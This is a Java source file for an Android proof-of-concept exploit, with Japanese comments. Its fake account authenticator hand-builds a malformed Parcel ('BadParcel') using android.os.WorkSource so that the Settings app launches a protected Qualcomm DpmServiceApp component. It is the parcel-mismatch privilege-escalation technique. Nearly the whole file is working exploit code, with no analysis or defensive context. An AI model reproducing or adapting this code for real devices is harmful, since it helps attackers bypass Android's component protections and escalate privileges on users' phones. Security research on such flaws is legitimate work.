package com.example.dpmpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {

    private static final String TAG = "MyAuthenticator";
    private Context mContext;

    public MyAuthenticator(Context context) {
        super(context);
        mContext = context;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {

        Log.d(TAG, "addAccount called");

        // ここで BadParcel を構築し、Settings に戻す Bundle に含める
        Bundle resultBundle = new Bundle();

        // ターゲット: DpmServiceApp を起動する Intent (Service だが、Activity として扱う)
        Intent evilIntent = new Intent();
        evilIntent.setComponent(new ComponentName("com.qti.dpmserviceapp",
                "com.qti.dpmserviceapp.DpmServiceApp"));
        evilIntent.putExtra("__poc_payload", "trigger");

        // 通常は KEY_INTENT に設定すると Settings が startActivity する
        resultBundle.putParcelable(AccountManager.KEY_INTENT, evilIntent);

        // しかし、より強力な BadParcel を構築するために、手動で Parcel を操作する
        // (以下は元の MyAuthenticator のコードを完全に再現)
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();

        // --- 元のコードの完全な複製 (バイト列生成) ---
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(2);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("android.os.WorkSource");
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(13);
        obtain2.writeInt(13);
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        // ここで intent を Parcel に書き込む (obtain3 に書き込んで append)
        evilIntent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        Log.d(TAG, "BadParcel length is " + Integer.toHexString(dataSize));

        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444e42); // 'L' 'D' 'N' 'B' マジック
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);

        // Bundle に読み込む
        Bundle badBundle = new Bundle();
        badBundle.readFromParcel(obtain);

        // 元の resultBundle にマージ (実際には badBundle をそのまま返しても良い)
        resultBundle.putAll(badBundle);

        // 後片付け
        obtain.recycle();
        obtain2.recycle();
        obtain3.recycle();

        Log.d(TAG, "BadParcel Bundle 構築完了: " + resultBundle.toString());
        return resultBundle;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response,
                                     Account account, Bundle options) {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response,
                               Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response,
                                    Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response,
                              Account account, String[] features) {
        return null;
    }
}
